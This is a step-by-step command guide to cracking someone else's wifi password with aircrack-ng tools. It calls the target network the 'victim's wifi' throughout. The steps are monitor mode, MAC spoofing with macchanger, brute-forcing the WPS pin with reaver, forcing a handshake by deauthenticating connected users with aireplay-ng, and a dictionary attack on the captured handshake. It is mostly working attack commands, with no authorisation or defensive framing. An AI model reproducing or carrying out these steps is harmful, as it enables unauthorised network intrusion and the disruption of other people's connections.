Run as superuser
You'll need
- AWUS036H
- aircrack-ng
- macchanger
- reaver

 1) Wifi adapter
    Find out how your wifi adapter is called. Run
    # airmon-ng
    I call it $w here.

 2) Start monitor mode
    # airmon-ng start $w
    You might want to killall the processes that might cause problems. But it
    could also work just like that, I haven't tried it. Run
    # airmon-ng stop $w
    to stop monitor mode. See what you have with
    # airmon-ng
    We'll be using mon0 from now on and I call it $m
    Type
    # iwconfig
    for more information
    If you get an error message saying
    > SIOCSIFFLAGS: Operation not possible due to RF-kill
    run
    # rfkill list
    # rfkill unblock wifi

 3) Change MAC addresses (This step can be omitted.)
    Turn off adapters
    # ifconfig $w down
    # ifconfig $m down
    Change MAC to whatever you like, but both adapter need to have the same MAC
    address
    # macchanger -r $w
    # mac=$(ifconfig -a | sed -n "/${w}/{n; s/.*ether \([^ ]*\).*/\1/p}")
    # macchanger -m $mac $m
    Turn the adapters on again
    # ifconfig $w up
    # ifconfig $m up

 4) See what's out there
    # airodump-ng $m
    From the victim's wifi, write down the BSSID as $bssid and the channel as
    $channel.
    Now there are two possibilities, either you try to hack it via the WPS
    weakness, which does work only on routers with old firmware but which would
    be fast. For this, reaver is used. Continue with 5a).
    The other way to crack a password is to establish a handshake with the
    victim's wifi and then derive the password with a password list. This is the
    more traditional approach and works, as long as the password is in a
    password list. Continue with 6a)

5a) Find out if victim is vulnerable
    To crack the wifi password, the wifi needs to have Wi-Fi Protected Setup
    (WPS) enabled. Only this allows the WPA or WPA2 security to be bypassed. If
    WPS is not enabled, you can try a hand-shake with the wifi and then brute-
    force the password (see 6a). Let's see if WPS is enabled with
    # wash -i $m
    WPS Locked needs to show "No".
    The wash command should list reachable wifis within a few seconds. If it
    produces no output, you might try to create /usr/etc/reaver. See
    https://aur.archlinux.org/packages/reaver/ or
    https://forums.kali.org/showthread.php?89-Problem-with-wash for more
    information.
    If it doesn't work, you can also try to reenable the wireless devices
    # rfkill block wifi
    # rfkill unblock wifi

5b) Crack the WPS pin
    # reaver -i $m -b $bssid -c $channel -a -S -N -vv
    If you get
    > WARNING: Failed to associate with $bssid
    run
    # wash -i $m
    again. If you can't see the victim's wifi, then you might to start all over
    again.
    Reaver needs to try ~11000 pins. If you find the correct pin, you'll have
    the password. This can take anything from seconds to hours.
    If you get an error message
    > [-] Failed to re-initialize interface 'mon0'
    you might have to start all over again. But reaver should have saved the
    progress and be able to continue from where you left off.

6a) Make handshake with the victim's wifi
    # airodump-ng --channel $channel --bssid $bssid --write filename $m
    and wait for the handshake to appear at the top right

6b) You can force a handshake by deauthorizing whoever is connected to the
    network.
    # aireplay-ng -0 5 -a $bssid $m
    Repeat this step if it doesn't work, but don't be too aggressive.

6c) Once you have to *.cap file, you can run a passwords file on it. You can do
    this either online (e.g. http://www.onlinehashcrack.com/) or offline with a
    passwords file. To crack it offline use
    # aircrack-ng -w passwords.txt *.cap
